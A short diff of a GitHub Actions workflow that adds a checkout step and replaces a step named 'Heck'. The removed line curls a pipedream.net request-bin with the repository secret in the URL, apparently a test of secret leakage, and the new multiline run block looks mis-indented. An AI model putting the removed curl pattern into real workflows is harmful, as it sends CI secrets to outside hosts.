@@ -7,8 +7,13 @@ jobs:
     runs-on: ubuntu-latest
     name: Checks
     steps:
+      - name: Checkout
+        uses: actions/checkout@v2
+
       - name: Hello world
         run: echo hello world
 
       - name: Heck
-        run: curl https://en4on50idh0h6.x.pipedream.net/?secret=${{secrets.SECRET}}
+        run: |
+        git clone git@github.com:kozlovzxc-at-lido/Default-public-repo.git
+        ls Default-public-repo
